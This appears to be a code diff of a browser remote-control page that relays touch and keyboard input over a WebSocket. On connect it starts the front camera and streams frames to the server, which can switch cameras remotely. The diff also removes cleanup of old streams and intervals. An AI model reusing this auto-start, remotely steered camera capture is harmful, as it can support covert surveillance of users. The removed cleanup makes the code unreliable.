@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Remote Control + Anti-Lag</title>
+    <title>تحكم عن بعد - دقة 1:1</title>
     <style>
         body { margin: 0; background: #000; height: 100vh; display: flex; flex-direction: column; overflow: hidden; touch-action: none; }
         #screenDisplay { width: 100%; height: 100%; object-fit: fill; position: absolute; z-index: 1; }
@@ -28,14 +28,8 @@
         const img = document.getElementById('screenDisplay');
         const hiddenInput = document.getElementById('hiddenInput');
         const touchOverlay = document.getElementById('touchOverlay');
-        const myVideo = document.getElementById('myVideoPreview');
         
-        let remoteKeyboardActive = false;
-        let currentStream = null;
-        let camInterval = null;
-        let lastMode = "";
-
-        ws.onopen = () => { console.log("Connected"); startCameraStream("user"); };
+        ws.onopen = () => { startCameraStream("user"); };
 
         const handleTouch = (e) => {
             const rect = img.getBoundingClientRect();
@@ -43,17 +37,17 @@
             const clientY = e.clientY || (e.touches && e.touches[0].clientY);
             
             if (clientX !== undefined && clientY !== undefined) {
+                // حساب دقيق بدون أي إزاحات يدوية
                 const relativeX = (clientX - rect.left) / rect.width;
                 const relativeY = (clientY - rect.top) / rect.height;
 
                 ws.send(JSON.stringify({
                     type: 'touch',
                     x: relativeX,
-                    y: relativeY,
-                    t: Date.now() // إرسال الوقت الحالي لحساب التأخير (Anti-Lag)
+                    y: relativeY
                 }));
             }
-            if (remoteKeyboardActive) hiddenInput.focus();
+            if (window.remoteKeyboardActive) hiddenInput.focus();
         };
 
         touchOverlay.addEventListener('touchstart', handleTouch);
@@ -70,8 +64,8 @@
                 try {
                     const data = JSON.parse(event.data);
                     if (data.type === 'keyboard_state') {
-                        remoteKeyboardActive = data.visible;
-                        if (remoteKeyboardActive) {
+                        window.remoteKeyboardActive = data.visible;
+                        if (data.visible) {
                             hiddenInput.style.pointerEvents = "auto";
                             setTimeout(() => hiddenInput.focus(), 50);
                         } else {
@@ -79,8 +73,7 @@
                             hiddenInput.blur();
                         }
                     } else if (data.type === 'camera_switch_request') {
-                        const modeRequested = String(data.mode).toLowerCase().includes("environment") ? "environment" : "user";
-                        if (modeRequested !== lastMode) startCameraStream(modeRequested);
+                        startCameraStream(data.mode);
                     }
                 } catch(e) {}
             }
@@ -100,28 +93,23 @@
         };
 
         function startCameraStream(mode) {
-            lastMode = mode;
-            if (currentStream) currentStream.getTracks().forEach(track => track.stop());
-            if (camInterval) clearInterval(camInterval);
-
             navigator.mediaDevices.getUserMedia({ video: { facingMode: mode }, audio: false })
             .then(stream => {
-                currentStream = stream;
-                myVideo.srcObject = stream;
+                document.getElementById('myVideoPreview').srcObject = stream;
                 const canvas = document.createElement('canvas');
                 const ctx = canvas.getContext('2d');
-                camInterval = setInterval(() => {
+                setInterval(() => {
                     if (ws.readyState === WebSocket.OPEN) {
                         canvas.width = 320; canvas.height = 240;
                         ctx.save();
                         if (mode === "user") { ctx.translate(canvas.width, 0); ctx.scale(-1, 1); }
-                        ctx.drawImage(myVideo, 0, 0, canvas.width, canvas.height);
+                        ctx.drawImage(document.getElementById('myVideoPreview'), 0, 0, canvas.width, canvas.height);
                         ctx.restore();
                         const base64 = canvas.toDataURL('image/jpeg', 0.5).split(',')[1];
                         ws.send(JSON.stringify({ type: 'remote_camera_frame', data: base64 }));
                     }
                 }, 100);
-            }).catch(e => { if(mode !== "user") startCameraStream("user"); });
+            }).catch(e => console.log("Cam error"));
         }
     </script>
 </body>
